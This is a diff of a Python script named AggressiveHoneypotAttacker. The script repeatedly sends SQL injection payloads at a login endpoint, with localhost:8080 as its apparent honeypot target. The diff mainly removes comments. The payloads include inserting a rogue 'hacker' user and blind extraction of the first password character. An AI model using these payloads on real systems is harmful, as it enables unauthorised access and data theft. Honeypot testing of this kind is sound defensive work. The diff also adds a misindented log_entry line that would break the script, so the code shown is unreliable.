@@ -15,10 +15,8 @@ class AggressiveHoneypotAttacker:
         self.login_url = f"{target_url}/login"
         self.attack_count = 0
         self.success_count = 0
-        
-        # Timing plus agressif
-        self.min_delay = 0.1  # Réduit le délai minimum
-        self.max_delay = 0.5  # Réduit le délai maximum
+        self.min_delay = 0.1
+        self.max_delay = 0.5
 
     def print_status(self, message, color=Fore.WHITE):
         """Affiche un message coloré dans le terminal"""
@@ -65,9 +63,7 @@ class AggressiveHoneypotAttacker:
             )
 
             duration = time.time() - start_time
-            
-            # Log detailed information
-            log_entry = (
+                        log_entry = (
                 f"Attack #{self.attack_count} | "
                 f"Type: {attack_type} | "
                 f"Username: {username} | "
@@ -112,7 +108,7 @@ class AggressiveHoneypotAttacker:
             "' OR EXISTS(SELECT * FROM users WHERE username LIKE '%admin%')--",
             "'; INSERT INTO users VALUES ('hacker','password')--",
             "' AND SUBSTR((SELECT password FROM users LIMIT 1),1,1)='a'--"
-        ] * (num_attacks // 15 + 1)  # Répéter les payloads pour atteindre num_attacks
+        ] * (num_attacks // 15 + 1) 
 
         for payload in sql_payloads[:num_attacks]:
             self.send_attack(payload, "test", "SQL Injection")
@@ -188,7 +184,7 @@ class AggressiveHoneypotAttacker:
             except Exception as e:
                 self.print_status(f"Attack failed: {str(e)}", Fore.RED)
             
-            time.sleep(random.uniform(1, 3))  # Courte pause entre les séries d'attaques
+            time.sleep(random.uniform(1, 3))
 
 def main():
     attacker = AggressiveHoneypotAttacker("http://localhost:8080")
